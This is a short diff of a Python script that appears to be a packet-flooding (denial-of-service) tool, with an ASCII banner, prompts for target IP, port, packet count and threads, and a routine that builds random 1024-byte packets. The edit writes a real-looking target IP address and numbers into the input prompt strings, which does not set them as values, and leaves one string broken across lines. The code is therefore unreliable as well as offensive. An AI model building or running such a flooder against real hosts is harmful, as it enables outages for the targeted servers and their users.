@@ -14,11 +14,12 @@ print("  ░██╔██╗░██║░░░░░██╔══██�
 print("  ██╔╝╚██╗███████╗██████╦╝██████╔╝ ")
 print("  ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░ ")
 
-ip = str(input(" IP TARGET:"))
-port = int(input(" PORT:"))
+ip = str(input("34.101.233.134T:"))
+port = int(input(" 7777"))
 choice = str(input(" GASKEN KIRIM PAKET?(y/n):"))
-times = int(input(" PACKETS:"))
-threads = int(input(" THREAD:"))
+times = int(input(" 9999
+"))
+threads = int(input(" 9999"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[PACKETS!!]","[PACKETS!!]","[PACKETS!!]"))
